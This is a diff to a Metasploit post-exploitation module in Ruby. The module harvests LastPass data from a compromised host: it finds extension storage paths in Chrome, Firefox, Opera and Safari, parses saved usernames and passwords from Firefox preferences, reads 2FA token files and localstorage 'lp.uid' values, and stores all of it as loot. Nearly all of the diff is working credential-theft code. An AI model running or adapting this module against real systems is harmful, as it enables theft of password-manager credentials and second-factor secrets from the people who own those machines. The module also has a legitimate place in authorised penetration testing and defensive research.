@@ -49,22 +49,7 @@ class Metasploit3 < Msf::Post
 
     print_status "Extracting 2FA tokens"
     localstorage_map = build_localstorage_map
-    if localstorage_map.empty?
-      print_status "No LastPass localstorage found"
-    else
-      twoFA_token_map = check_localstorage_for_2FA_token(localstorage_map)
-      lastpass_data.each_pair do |account, browser_map|
-        browser_map.each_pair do |browser, username_map|
-          username_map.each_pair do |user, data|
-            if twoFA_token_map[account][browser]
-              lastpass_data[account][browser][user] << "defverthbertvwervrfv"#twoFA_token_map[account][browser]
-            else
-              lastpass_data[account][browser][user] << "NOT_FOUND"
-            end
-          end
-        end
-      end
-    end
+    lastpass_data = check_localstorage_for_2FA_token(localstorage_map, lastpass_data) unless localstorage_map.empty?
 
     print_lastpass_data(lastpass_data)
   end
@@ -92,12 +77,12 @@ class Metasploit3 < Msf::Post
         browser_path_map = {
           'Chrome' => "#{user_profile['LocalAppData']}/.config/google-chrome/Default/databases/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0",
           'Firefox' => "#{user_profile['LocalAppData']}/.mozilla/firefox",
-          'Opera' => "#{user_profile['LocalAppData']}/.config/Opera/databases/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0.localstorage"
+          'Opera' => "#{user_profile['LocalAppData']}/.config/Opera/databases/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0"
         }
       when /osx/
         browser_path_map = {
           'Chrome' => "#{user_profile['LocalAppData']}/Google/Chrome/Default/databases/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0",
-          'Firefox' => "#{user_profile['LocalAppData']}\\Firefox\\Profiles",
+          'Firefox' => "#{user_profile['LocalAppData']}/Firefox/Profiles",
           'Opera' => "#{user_profile['LocalAppData']}/com.operasoftware.Opera/databases/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0",
           'Safari' => "#{user_profile['AppData']}/Safari/Databases/safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0"
         }
@@ -216,12 +201,22 @@ class Metasploit3 < Msf::Post
   def firefox_credentials(loot_path)
     credentials = []
     File.readlines(loot_path).each do |line|
-      if /user_pref\("extensions.lastpass.loginpws", "(?<encoded_creds>.*)"\);/ =~ line
+      if /user_pref\("extensions.lastpass.loginusers", "(?<encoded_users>.*)"\);/ =~ line
+        usernames = encoded_users.split("|")
+        usernames.each do |username|
+          credentials << [username, "NOT_FOUND"]
+        end
+      elsif /user_pref\("extensions.lastpass.loginpws", "(?<encoded_creds>.*)"\);/ =~ line
         creds_per_user = encoded_creds.split("|")
         creds_per_user.each do |user_creds|
           parts = user_creds.split('=')
-          # Any valid credentials present?
-          credentials << parts if parts.size > 1
+          for creds in credentials # Check if we have the username already
+            if creds[0] == parts[0]
+              creds[1] = parts[1] # Add the password to the existing username
+            else
+              credentials << parts if parts.size > 1 # Add full credentials
+            end
+          end
         end
       else
         next
@@ -290,7 +285,7 @@ class Metasploit3 < Msf::Post
             ffcreds = firefox_credentials(loot_path)
             unless ffcreds.blank?
               ffcreds.each do |creds|
-                credentials[account][browser]={URI.unescape(creds[0]) => [URI.unescape(creds[1])]}
+                credentials[account][browser][URI.unescape(creds[0])] = [URI.unescape(creds[1])]
               end
             else
               credentials[account].delete("Firefox")
@@ -345,20 +340,20 @@ class Metasploit3 < Msf::Post
       when /win/
         browser_path_map = {
           'Chrome' => "#{user_profile['LocalAppData']}\\Google\\Chrome\\User Data\\Default\\Local Storage\\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0.localstorage",
-          'Firefox' => "#{user_profile['AppData']}\\Mozilla\\Firefox\\Profiles",
+          'Firefox' => "#{user_profile['LocalAppData']}\\LastPass",
           'Opera' => "#{user_profile['AppData']}\\Opera Software\\Opera Stable\\Local Storage\\chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0.localstorage",
           'Safari' => "#{user_profile['LocalAppData']}\\Apple Computer\\Safari\\LocalStorage\\safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0.localstorage"
         }
       when /unix|linux/
         browser_path_map = {
           'Chrome' => "#{user_profile['LocalAppData']}/.config/google-chrome/Default/Local Storage/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0.localstorage",
-          #'Firefox' => "#{user_profile['LocalAppData']}/.mozilla/firefox",
+          'Firefox' => "#{user_profile['LocalAppData']}/.lastpass",
           'Opera' => "#{user_profile['LocalAppData']}/.config/Opera/Local Storage/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0.localstorage"
         }
       when /osx/
         browser_path_map = {
           'Chrome' => "#{user_profile['LocalAppData']}/Google/Chrome/Default/Local Storage/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0.localstorage",
-          #'Firefox' => "#{user_profile['LocalAppData']}\\Firefox\\Profiles",
+          'Firefox' => "#{user_profile['LocalAppData']}/LastPass",
           'Opera' => "#{user_profile['LocalAppData']}/com.operasoftware.Opera/Local Storage/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0.localstorage",
           'Safari' => "#{user_profile['AppData']}/Safari/LocalStorage/safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0.localstorage"
         }
@@ -377,23 +372,25 @@ class Metasploit3 < Msf::Post
 
 
   #Extracts the 2FA token from localStorage
-  def check_localstorage_for_2FA_token(localstorage_map)
+  def check_localstorage_for_2FA_token(localstorage_map, lastpass_data)
     localstorage_map.each_pair do |account, browser_map|
       browser_map.each_pair do |browser, path|
         if browser == 'Firefox'
-          data = read_file(path)
-          loot_path = store_loot(
-            'firefox.preferences',
-            'text/javascript',
-            session,
-            data,
-            nil,
-            "Firefox preferences file #{path}"
-          )
-
-          firefox_credentials(loot_path).each do |creds|
-            credentials << [account, browser, URI.unescape(creds[0]), URI.unescape(creds[1])]
+          lastpass_data[account][browser].each_pair do |username, data|
+            path = path + client.fs.file.separator + OpenSSL::Digest::SHA256.hexdigest(username) + "_ff.sotp"
+            data = read_file(path) if client.fs.file.exists?(path) #Read file if it exists
+            data = "DECRYPTION_ERROR" if (data.blank? || data.size != 32) # Verify content
+            loot_path = store_loot(
+              'firefox.preferences',
+              'text/binary',
+              session,
+              data,
+              nil,
+              "Firefox 2FA token file #{path}"
+            )
+            lastpass_data[account][browser][username] << data
           end
+          
         else # Chrome, Safari and Opera
           data = read_file(path)
           loot_path = store_loot(
@@ -411,12 +408,15 @@ class Metasploit3 < Msf::Post
             "SELECT hex(value) FROM ItemTable " \
             "WHERE key = 'lp.uid';"
           ).flatten
-            token.blank? ? localstorage_map[account][browser] = "NOT_FOUND" : localstorage_map[account][browser] = token.pack('H*')
+
+          lastpass_data[account][browser].each_pair do |username, data|
+            token.blank? ? lastpass_data[account][browser][username] << "NOT_FOUND" : lastpass_data[account][browser][username] << token.pack('H*')
+          end
         end
       end
     end
 
-    localstorage_map
+    lastpass_data
   end
 
 
